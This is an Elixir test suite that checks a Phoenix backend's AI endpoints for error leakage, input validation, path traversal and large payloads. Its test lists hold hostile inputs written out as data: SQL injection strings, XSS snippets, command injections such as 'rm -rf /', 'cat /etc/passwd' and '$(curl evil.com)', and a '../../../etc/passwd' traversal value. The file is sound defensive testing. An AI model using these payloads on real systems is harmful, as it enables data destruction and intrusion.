defmodule GlobalbridgeBackendWeb.AIControllerSecurityTest do
  use GlobalbridgeBackendWeb.ConnCase, async: true

  alias GlobalbridgeBackend.Repo
  alias GlobalbridgeBackend.Schemas.User
  alias GlobalbridgeBackend.Schemas.Thread
  alias GlobalbridgeBackend.Schemas.ThreadParticipant

  describe "error sanitization" do
    setup do
      # Create test user
      user = Repo.insert!(%User{
        id: Ecto.UUID.generate(),
        email: "test@example.com",
        username: "test_user",
        display_name: "Test User",
        auth0_id: "auth0|test123"
      })

      # Create test thread
      thread = Repo.insert!(%Thread{
        id: Ecto.UUID.generate(),
        title: "Test Thread",
        thread_type: "group",
        database_shard_id: "test-shard-security"
      })

      # Add user as participant
      Repo.insert!(%ThreadParticipant{
        id: Ecto.UUID.generate(),
        thread_id: thread.id,
        user_id: user.id,
        role: "member",
        joined_at: DateTime.utc_now()
      })

      # Create authenticated connection
      conn = build_conn()
      |> assign(:current_user, user)

      {:ok, conn: conn, user: user, thread: thread}
    end

    test "translate endpoint does not leak internal error details", %{conn: conn} do
      # Trigger an error by providing invalid input that will cause an exception
      conn = post(conn, ~p"/api/ai/translate", %{
        "text" => String.duplicate("x", 1_000_000), # Very large input
        "target_language" => "invalid-lang-code"
      })

      # Should return generic error message, not internal details
      assert json_response(conn, 422)["error"] =~ ~r/Translation failed/i
      response = json_response(conn, 422)

      # Should NOT contain:
      refute Map.has_key?(response, "details")
      refute Map.has_key?(response, "stacktrace")
      refute Map.has_key?(response, "exception")

      # Error should be logged but not returned to client
    end

    test "summarize_thread endpoint does not leak internal error details", %{conn: conn, thread: thread} do
      # Trigger error with invalid parameters
      conn = post(conn, ~p"/api/ai/summarize_thread", %{
        "thread_id" => thread.id,
        "max_length" => -1 # Invalid max_length
      })

      response = json_response(conn, 422)
      assert response["error"] =~ ~r/Summarization failed|An error occurred/i

      # Should NOT leak internal details
      refute Map.has_key?(response, "details")
      refute Map.has_key?(response, "stacktrace")
    end

    test "search_semantic endpoint does not leak internal error details", %{conn: conn, thread: thread} do
      # Trigger error with malformed query
      conn = post(conn, ~p"/api/ai/search_semantic", %{
        "query" => "", # Empty query
        "thread_id" => thread.id,
        "limit" => -1 # Invalid limit
      })

      response = json_response(conn, 422)
      assert response["error"]

      # Should NOT leak internal details
      refute Map.has_key?(response, "details")
      refute Map.has_key?(response, "stacktrace")
    end

    test "extract_tasks endpoint does not leak internal error details", %{conn: conn, thread: thread} do
      # Trigger error with invalid thread_id format
      conn = post(conn, ~p"/api/ai/extract_tasks", %{
        "thread_id" => "'; DROP TABLE messages; --"
      })

      # Should get authorization error or processing error
      assert conn.status in [403, 422, 500]

      response = json_response(conn, conn.status)
      assert response["error"]

      # Should NOT leak SQL or internal details
      refute Map.has_key?(response, "details")
      refute Map.has_key?(response, "stacktrace")
      refute response["error"] =~ ~r/SQL|DROP|TABLE/i
    end

    test "vec_health endpoint uses secure random temp table names", %{conn: conn, thread: thread} do
      # Call endpoint multiple times
      responses = Enum.map(1..5, fn _ ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/vec_health", %{
          "thread_id" => thread.id
        })

        json_response(conn, 200)
      end)

      # All calls should succeed
      assert Enum.all?(responses, fn response ->
        Map.has_key?(response, "success")
      end)

      # The implementation uses :crypto.strong_rand_bytes(12) which should be
      # unpredictable. We can't directly test the temp table names (internal),
      # but we verify the endpoint works correctly
    end
  end

  describe "input validation and sanitization" do
    setup do
      user = Repo.insert!(%User{
        id: Ecto.UUID.generate(),
        email: "test@example.com",
        username: "test_user",
        display_name: "Test User",
        auth0_id: "auth0|test123"
      })

      thread = Repo.insert!(%Thread{
        id: Ecto.UUID.generate(),
        title: "Test Thread",
        thread_type: "group",
        database_shard_id: "test-shard-security"
      })

      Repo.insert!(%ThreadParticipant{
        id: Ecto.UUID.generate(),
        thread_id: thread.id,
        user_id: user.id,
        role: "member",
        joined_at: DateTime.utc_now()
      })

      conn = build_conn() |> assign(:current_user, user)

      {:ok, conn: conn, user: user, thread: thread}
    end

    test "rejects SQL injection attempts in thread_id", %{conn: conn} do
      sql_injections = [
        "'; DROP TABLE messages; --",
        "\" OR \"1\"=\"1",
        "' UNION SELECT * FROM users --",
        "thread_id'; DELETE FROM threads; --"
      ]

      Enum.each(sql_injections, fn malicious_id ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/summarize_thread", %{
          "thread_id" => malicious_id
        })

        # Should get error, not execute SQL
        assert conn.status in [400, 403, 422, 500]

        response = json_response(conn, conn.status)
        # Error message should not contain SQL keywords
        refute to_string(response["error"]) =~ ~r/DROP|DELETE|UNION|SELECT/i
      end)
    end

    test "rejects XSS attempts in text input", %{conn: conn} do
      xss_attempts = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('XSS')",
        "<iframe src='evil.com'></iframe>"
      ]

      Enum.each(xss_attempts, fn malicious_text ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/translate", %{
          "text" => malicious_text,
          "target_language" => "es"
        })

        # Should process safely (or reject), but not execute scripts
        # Response should not echo back unescaped HTML
        response = conn.status
        assert response in [200, 422]
      end)
    end

    test "rejects command injection attempts", %{conn: conn} do
      command_injections = [
        "test; rm -rf /",
        "test | cat /etc/passwd",
        "test && whoami",
        "test `reboot`",
        "test $(curl evil.com)"
      ]

      Enum.each(command_injections, fn malicious_cmd ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/translate", %{
          "text" => malicious_cmd,
          "target_language" => "es"
        })

        # Should not execute commands
        assert conn.status in [200, 422]
      end)
    end

    test "handles null byte injection attempts", %{conn: conn, thread: thread} do
      null_byte_attempts = [
        "thread_id\0malicious",
        "test\u0000exploit",
        "value\x00injection"
      ]

      Enum.each(null_byte_attempts, fn malicious_input ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/extract_tasks", %{
          "thread_id" => thread.id,
          "query" => malicious_input
        })

        # Should handle safely
        assert conn.status in [200, 422, 500]
      end)
    end

    test "validates parameter types and ranges", %{conn: conn, thread: thread} do
      # Test invalid limit values
      invalid_limits = [-1, 0, 10_000, "not_a_number", nil, %{}, []]

      Enum.each(invalid_limits, fn invalid_limit ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/search_semantic", %{
          "query" => "test",
          "thread_id" => thread.id,
          "limit" => invalid_limit
        })

        # Should handle invalid input gracefully
        assert conn.status in [200, 400, 422]
      end)
    end
  end

  describe "path traversal prevention" do
    setup do
      user = Repo.insert!(%User{
        id: Ecto.UUID.generate(),
        email: "test@example.com",
        username: "test_user",
        display_name: "Test User",
        auth0_id: "auth0|test123"
      })

      conn = build_conn() |> assign(:current_user, user)

      {:ok, conn: conn, user: user}
    end

    test "rejects path traversal in thread_id via vec_health", %{conn: conn} do
      # Create a thread with normal ID first
      thread = Repo.insert!(%Thread{
        id: Ecto.UUID.generate(),
        title: "Test Thread",
        thread_type: "group",
        database_shard_id: "../../../etc/passwd"
      })

      Repo.insert!(%ThreadParticipant{
        id: Ecto.UUID.generate(),
        thread_id: thread.id,
        user_id: conn.assigns.current_user.id,
        role: "member",
        joined_at: DateTime.utc_now()
      })

      # Attempt to call vec_health with the malicious shard_id
      # The ThreadRepo.get_repo should reject it via sanitize_shard_id
      assert_raise ArgumentError, fn ->
        post(conn, ~p"/api/ai/vec_health", %{
          "thread_id" => thread.id
        })
      end
    end
  end

  describe "rate limiting and abuse prevention" do
    setup do
      user = Repo.insert!(%User{
        id: Ecto.UUID.generate(),
        email: "test@example.com",
        username: "test_user",
        display_name: "Test User",
        auth0_id: "auth0|test123"
      })

      conn = build_conn() |> assign(:current_user, user)

      {:ok, conn: conn, user: user}
    end

    test "handles extremely large payloads gracefully", %{conn: conn} do
      # Test with very large text input
      huge_text = String.duplicate("x", 10_000_000) # 10MB of text

      conn = post(conn, ~p"/api/ai/translate", %{
        "text" => huge_text,
        "target_language" => "es"
      })

      # Should reject or handle without crashing
      assert conn.status in [413, 422, 500]
    end

    test "handles rapid repeated requests without leaking resources", %{conn: conn} do
      # Make multiple rapid requests
      results = Enum.map(1..10, fn _ ->
        conn = post(build_conn() |> assign(:current_user, conn.assigns.current_user),
                    ~p"/api/ai/translate", %{
          "text" => "hello",
          "target_language" => "es"
        })

        conn.status
      end)

      # All should complete (rate limiting not implemented yet, but should not crash)
      assert Enum.all?(results, fn status -> status in [200, 422, 429] end)
    end
  end
end
